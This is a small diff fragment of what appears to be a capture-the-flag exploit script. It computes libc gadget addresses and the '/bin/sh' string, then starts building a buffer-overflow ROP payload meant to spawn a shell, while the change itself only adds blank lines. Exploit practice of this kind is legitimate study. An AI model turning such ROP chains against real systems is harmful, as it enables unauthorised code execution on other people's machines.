@@ -38,6 +38,8 @@ def main():
 	syscall = libc.addr + 0x550da
 	bash_addr = libc.addr + next(libc.search(b"/bin/sh\0"))
 
+	
+
 	payload = b"A"*0x48
 	payload += p64(p_rdi)
 	payload += p64(bash_addr)
